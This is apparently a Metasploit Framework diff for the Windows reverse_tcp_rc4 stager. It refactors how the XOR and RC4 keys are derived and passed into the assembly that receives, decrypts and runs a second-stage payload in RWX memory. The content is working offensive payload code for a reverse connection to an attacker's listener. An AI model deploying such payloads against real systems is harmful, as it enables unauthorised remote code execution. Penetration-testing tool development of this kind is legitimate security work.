@@ -13,11 +13,11 @@ module Msf
 #
 ###
 
-module Payload::Windows::ReverseTcpRC4
+module Payload::Windows::ReverseTcpRc4
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseTcp
-  include Msf::Payload::Windows::RC4
+  include Msf::Payload::Windows::Rc4
 
   #
   # Register reverse_tcp_rc4 specific options
@@ -31,11 +31,13 @@ module Payload::Windows::ReverseTcpRC4
   # Generate the first stage
   #
   def generate
+    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
       retry_count: datastore['ReverseConnectRetries'],
-      rc4_passwd:  datastore['RC4PASSWORD'],
+      xorkey:      xorkey,
+      rc4key:      rc4key,
       reliable:    false
     }
 
@@ -72,7 +74,6 @@ module Payload::Windows::ReverseTcpRC4
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_block_recv_rc4(opts={})
-    xorkey, rc4key = rc4_keys(opts[:rc4_passwd])
     asm = %Q^
       ; Same as block_recv, only that the length will be XORed and the stage will be RC4 decoded.
       ; Differences to block_recv are indented two more spaces.
@@ -90,7 +91,7 @@ module Payload::Windows::ReverseTcpRC4
         call ebp               ; recv( s, &dwLength, 4, 0 );
         ; Alloc a RWX buffer for the second stage
         mov esi, [esi]         ; dereference the pointer to the second stage length
-          xor esi, "#{xorkey}"      ; XOR the stage length
+          xor esi, "#{opts[:xorkey]}"      ; XOR the stage length
           lea ecx, [esi+0x00]  ; ECX = stage length + S-box length (alloc length)
         push byte 0x40         ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
@@ -123,7 +124,7 @@ module Payload::Windows::ReverseTcpRC4
           push edi             ; save socket
           mov edi, ebx         ; address of S-box
           call after_key       ; Call after_key, this pushes the address of the key onto the stack.
-          db "#{rc4key}"
+          db "#{opts[:rc4key]}"
       after_key:
         pop esi                ; ESI = RC4 key
       #{asm_decrypt_rc4}
